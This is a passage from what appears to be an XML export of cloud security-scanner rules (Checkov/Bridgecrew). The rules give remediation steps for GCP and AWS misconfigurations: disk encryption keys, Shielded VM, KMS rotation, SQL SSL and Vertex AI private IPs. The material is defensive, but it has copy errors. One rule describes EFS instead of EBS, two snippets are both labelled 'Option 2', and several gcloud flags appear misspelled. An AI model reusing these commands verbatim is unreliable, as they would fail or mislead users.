<p>We recommend you supply your own encryption keys for Google to use, at a minimum to encrypt boot disks for instances. This helps protect the Google-generated keys used to encrypt and decrypt your data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>Currently there is no way to update the encryption of an existing disk.<br/>
Ensure you create new disks with Encryption set to Customer supplied.</p>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/compute/disks" target="_self">Compute Engine Disks</a>.</li>
<li>Click <strong>CREATE DISK</strong>.</li>
<li>Set <strong>Encryption type</strong> to <strong>Customer supplied</strong>.</li>
<li>In the dialog box, enter the <strong>Key</strong>.</li>
<li>Select <strong>Wrapped key</strong>.</li>
<li>Click <strong>Create</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>In the gcloud compute tool, encrypt a disk, use the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">--csek-key-file flag during instance creation</code></p>
<p>If you are using an RSA-wrapped key, use the gcloud beta component and the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud (beta) compute instances create INSTANCE_NAME --csek-key-file &lt;example-file.json&gt;</code></p>
<p>To encrypt a standalone persistent disk, use the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud (beta) compute disks create DISK_NAME --csek-key-file &lt;examplefile.json&gt;</code></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>
<p><strong>Resource</strong>: google_compute_disk</p>
</li>
<li>
<p><strong>Field</strong>: disk_encryption_key</p>
</li>
<li>
<p><strong>Resource</strong>: google_compute_instance</p>
</li>
<li>
<p><strong>Argument</strong>: boot_disk:disk_encryption_key_raw</p>
</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">//Option 2
resource "google_compute_disk" "default" {
  name  = "test-disk"
  type  = "pd-ssd"
  zone  = "us-central1-a"
  image = "debian-8-jessie-v20170523"
  physical_block_size_bytes = 4096
+  disk_encryption_key {
+    raw_key = &lt;raw key&gt;
  or
+    kms_key_self_link = &lt;key link&gt;
    }
}

//Option 2
resource "google_compute_instance" "default" {
  name         = "test"
  machine_type = "n1-standard-1"
  zone         = "us-central1-a"
  boot_disk {
    disk_encryption_key_raw = &lt;encryption key&gt;
    }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/encrypt-boot-disks-for-instances-with-cseks' target='_blank'> https://docs.bridgecrew.io/docs/encrypt-boot-disks-for-instances-with-cseks</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/encrypt-boot-disks-for-instances-with-cseks' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_39</key>
    <name>Ensure compute instances launch with shielded VM enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="compute-instances-launch-without-shielded-vm-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-compute-instances-launch-without-shielded-vm-enabled"></div>Compute instances launch without shielded VM enabled</div><a aria-label="Skip link to Compute instances launch without shielded VM enabled" class="heading-anchor-icon fa fa-anchor" href="#compute-instances-launch-without-shielded-vm-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Shielded VMs are virtual machines (VMs) on a Google Cloud Platform hardened by a set of security controls that help defend against rootkits and bootkits. Shielded VM offers verifiable integrity on your Compute Engine VM instances, so you can be confident your instances have not been compromised by boot- or kernel-level malware or rootkits. The verifiable integrity of a Shielded VM is achieved through the use of Secure Boot and integrity monitoring, see below for further details.</p>
<p>We recommend you launch Compute instances with Shielded VM enabled to defend against advanced threats, and ensure that the boot loader and firmware on your VMs are signed and untampered. Shielded VM instances run firmware signed and verified using Google's Certificate Authority, ensuring the instance's firmware is unmodified and the root of trust for Secure Boot is established.</p>
<p><strong>Secure Boot</strong> is a virtual trusted platform module (vTPM)-enabled Measured Boot. It helps ensure that the system only runs authentic software by verifying the digital signature of all boot components and halting the boot process if signature verification fails.</p>
<p><strong>Integrity monitoring</strong> helps you understand and make decisions about the state of your VM instances. The Shielded VM vTPM enables Measured Boot by performing the measurements needed to create the integrity policy baseline used for comparison with measurements from subsequent VM boots to determine any changes. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/compute/instances" target="_self">VM instances</a>.</li>
<li>Select the <em>instance name</em> to view the <strong>VM instance details</strong> page.</li>
<li>Stop the instance, by clicking <strong>STOP</strong>.</li>
<li>When the instance has stopped, click <strong>EDIT</strong>.</li>
<li>In the <strong>Shielded VM</strong> section, turn on both <strong>vTPM</strong> and<strong> Integrity Monitoring</strong>.</li>
<li>Optionally, if you do not use any custom or unsigned drivers on the instance, turn on <strong>Secure Boot</strong>.</li>
<li>To modify the instance, click <strong>SAVE</strong>. </li>
<li>To restart the instance, click <strong>START</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>You can only enable Shielded VM options on instances that have Shielded VM support. For a list of Shielded VM public images, run the gcloud compute images list command with the following flags:<br/>
<em>gcloud compute images list --project gce-uefi-images --no-standard-images</em></p>
<ol>
<li>
<p>To stop the instance, use the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute instances stop INSTANCE_NAME</code></p>
</li>
<li>
<p>To update the instance, use the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute instances update INSTANCE_NAME --shielded-vtpm --shielded-vmintegrity-monitoring</code></p>
</li>
<li>
<p>Optionally, if you do not use any custom or unsigned drivers on the instance, to turn on secure boot use the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute instances update INSTANCE_NAME --shielded-vm-secure-boot</code></p>
</li>
<li>
<p>To restart the instance, use the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute instances start INSTANCE_NAME</code></p>
</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_compute_instance</li>
<li><strong>Arguments</strong>:<br/>
enable_integrity_monitoring - set to true by default, should not be overriden, i.e should not be set to false.<br/>
enable_vtpm - set to true by default, should not be overriden, i.e should not be set to false.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_compute_instance" "default" {
  name         = "test"
  machine_type = "n1-standard-1"
  zone         = "us-central1-a"
  boot_disk {}
+    shielded_instance_config {
-        enable_integrity_monitoring = false
-        enable_vtpm                 = false
        }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_general_y' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_general_y</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_general_y' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_43</key>
    <name>Ensure GCP KMS encryption key is rotating every 90 days</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-kms-encryption-key-is-not-rotating-every-90-days"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-kms-encryption-key-is-not-rotating-every-90-days"></div>GCP KMS encryption key is not rotating every 90 days</div><a aria-label="Skip link to GCP KMS encryption key is not rotating every 90 days" class="heading-anchor-icon fa fa-anchor" href="#gcp-kms-encryption-key-is-not-rotating-every-90-days"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Google Cloud Key Management Service stores cryptographic keys in a hierarchical structure designed for access control management. The format for the rotation schedule depends on the client library used. In Terraform, the rotation period unit must be seconds.</p>
<p>A key is a named object representing a cryptographic key used for a specific purpose, including data protection. The key material, the actual bits used for encryption, can change over time as new key versions are created. A collection of files could be encrypted with the same key and people with decrypt permissions on that key would be able to decrypt those files. </p>
<p>We recommend you set a key rotation period, including start time. A key can be created with a specified rotation period, which is the time when new key versions are generated automatically. A key can also be created with a specified next rotation time. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/security/kms" target="_self">Cryptographic Keys</a>.</li>
<li>Select the specific key ring.</li>
<li>From the list of keys, select the specific key and Click on the blade (3 dots) on the right side of the pop up.</li>
<li>Click <strong>Edit rotation period</strong>.</li>
<li>On the pop-up window, <strong>Select a new rotation period</strong> in days; this should be less than 90 days. Then select a <strong>Starting on</strong> date; this is when the rotation period begins.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>Update and schedule rotation by <strong>ROTATION_PERIOD</strong> and <strong>NEXT_ROTATION_TIME</strong> for each key:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud kms keys update new 
--keyring=KEY_RING 
--location=LOCATION 
--nextrotation-time=NEXT_ROTATION_TIME 
--rotation-period=ROTATION_PERIOD
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_kms_crypto_key</li>
<li><strong>Argument</strong>: rotation_period</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_kms_crypto_key" "key" {
  name            = "crypto-key-example"
  key_ring        = google_kms_key_ring.keyring.id
+ rotation_period = "7776000s"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_general_4' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_general_4</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_general_4' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_6</key>
    <name>Ensure incoming connections to Cloud SQL database instances use SSL</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="incoming-connections-to-cloud-sql-database-instances-do-not-use-ssl"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-incoming-connections-to-cloud-sql-database-instances-do-not-use-ssl"></div>Incoming connections to Cloud SQL database instances do not use SSL</div><a aria-label="Skip link to Incoming connections to Cloud SQL database instances do not use SSL" class="heading-anchor-icon fa fa-anchor" href="#incoming-connections-to-cloud-sql-database-instances-do-not-use-ssl"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Cloud SQL is a fully managed relational database service for MySQL, PostgreSQL and SQL Server. It offers data encryption at rest and in transit, Private connectivity with VPC and user-controlled network access with firewall protection. Cloud SQL creates a server certificate automatically when a new instance is created. </p>
<p>We recommend you enforce all connections to use SSL/TLS.</p> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_general_1' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_general_1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_general_1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_212</key>
    <name>Ensure AWS EBS Volume is encrypted by Key Management Service (KMS) using a Customer Managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-ebs-volume-is-not-encrypted-by-key-management-service-kms-using-a-customer-managed-key-cmk"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-ebs-volume-is-not-encrypted-by-key-management-service-kms-using-a-customer-managed-key-cmk"></div>AWS EBS Volume is not encrypted by Key Management Service (KMS) using a Customer Managed Key (CMK)</div><a aria-label="Skip link to AWS EBS Volume is not encrypted by Key Management Service (KMS) using a Customer Managed Key (CMK)" class="heading-anchor-icon fa fa-anchor" href="#aws-ebs-volume-is-not-encrypted-by-key-management-service-kms-using-a-customer-managed-key-cmk"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Elastic File Systems (EFSs) which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your EFS data. It gives you full control over the encrypted data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="resource-aws_ebs_volume"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-resource-aws-ebs-volume"></div>Resource: aws_ebs_volume</div><a aria-label="Skip link to Resource: aws_ebs_volume" class="heading-anchor-icon fa fa-anchor" href="#resource-aws_ebs_volume"></a></h2>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="arguments-kms_key_id"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-arguments-kms-key-id"></div>Arguments: kms_key_id </div><a aria-label="Skip link to Arguments: kms_key_id " class="heading-anchor-icon fa fa-anchor" href="#arguments-kms_key_id"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_ebs_volume" "pass" {
  availability_zone = data.aws_availability_zones.available.names[0]
  size              = 1
  encrypted         = true
  kms_key_id        = aws_kms_key.test.arn

  tags = {
    Name = "taggy"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-ebs-volume-is-encrypted-by-key-management-service-kms-using-a-customer-managed-key-cmk' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-ebs-volume-is-encrypted-by-key-management-service-kms-using-a-customer-managed-key-cmk</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-ebs-volume-is-encrypted-by-key-management-service-kms-using-a-customer-managed-key-cmk' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_254</key>
    <name>Ensure AWS DLM cross-region events are encrypted with a Customer Managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-dlm-cross-region-events-are-not-encrypted-with-a-customer-managed-key-cmk"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-dlm-cross-region-events-are-not-encrypted-with-a-customer-managed-key-cmk"></div>AWS DLM cross-region events are not encrypted with a Customer Managed Key (CMK)</div><a aria-label="Skip link to AWS DLM cross-region events are not encrypted with a Customer Managed Key (CMK)" class="heading-anchor-icon fa fa-anchor" href="#aws-dlm-cross-region-events-are-not-encrypted-with-a-customer-managed-key-cmk"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies DLM cross-region events) which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your DLM cross-region events data. It gives you full control over the encrypted data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="resource-aws_dlm_lifecycle_policy"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-resource-aws-dlm-lifecycle-policy"></div>Resource: aws_dlm_lifecycle_policy</div><a aria-label="Skip link to Resource: aws_dlm_lifecycle_policy" class="heading-anchor-icon fa fa-anchor" href="#resource-aws_dlm_lifecycle_policy"></a></h2>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="arguments-actioncross_region_copyencryption_configurationcmk_arn"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-arguments-action-cross-region-copy-encryption-configuration-cmk-arn"></div>Arguments: action.cross_region_copy.encryption_configuration.cmk_arn</div><a aria-label="Skip link to Arguments: action.cross_region_copy.encryption_configuration.cmk_arn" class="heading-anchor-icon fa fa-anchor" href="#arguments-actioncross_region_copyencryption_configurationcmk_arn"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_dlm_lifecycle_policy" "pass" {
  description        = "tf-acc-basic"
  execution_role_arn = aws_iam_role.example.arn

  policy_details {
    policy_type = "EVENT_BASED_POLICY"

    resource_types = []
    target_tags    = {}

    action {
      name = "tf-acc-basic"
      cross_region_copy {
        encryption_configuration {
          cmk_arn    = aws_kms_key.test.arn
          encryption = true
        }
        retain_rule {
          interval      = 15
          interval_unit = "MONTHS"
        }

      }
    }

    event_source {
      type = "MANAGED_CWE"
      parameters {
        description_regex = "^.*Created for policy: policy-1234567890abcdef0.*$"
        event_type        = "shareSnapshot"
        snapshot_owner    = [data.aws_caller_identity.current.account_id]
      }
    }
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-dlm-cross-region-events-are-encrypted-with-a-customer-managed-key-cmk' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-dlm-cross-region-events-are-encrypted-with-a-customer-managed-key-cmk</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-dlm-cross-region-events-are-encrypted-with-a-customer-managed-key-cmk' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_79</key>
    <name>Ensure GCP SQL database uses the latest Major version</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-sql-database-does-not-use-the-latest-major-version"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-sql-database-does-not-use-the-latest-major-version"></div>GCP SQL database does not use the latest Major version</div><a aria-label="Skip link to GCP SQL database does not use the latest Major version" class="heading-anchor-icon fa fa-anchor" href="#gcp-sql-database-does-not-use-the-latest-major-version"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-sql-database-uses-the-latest-major-version' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-sql-database-uses-the-latest-major-version</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-sql-database-uses-the-latest-major-version' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_89</key>
    <name>Ensure GCP Vertex AI instances are private</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-vertex-ai-instances-are-not-private"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-vertex-ai-instances-are-not-private"></div>GCP Vertex AI instances are not private</div><a aria-label="Skip link to GCP Vertex AI instances are not private" class="heading-anchor-icon fa fa-anchor" href="#gcp-vertex-ai-instances-are-not-private"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p><strong>Vertex AI Workbench</strong> is a data science service offered by GCP that leverages <a href="https://jupyterlab.readthedocs.io/en/stable/getting_started/overview.html" target="_self">JupyterLab</a> to explore and access data. Workbenches have public IPs assigned by default which can increase your attack surface and expose sensitive data.</p>
<p>We recommend you only assign private IPs to Vertex AI Workbenches.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>It's not currently possible to edit a <strong>Vertex AI workbench</strong> network setting to remove or add a public IP.</p>
<p>To create a <strong>Vertex AI Workbench</strong> with a private IP:</p>
<ol>
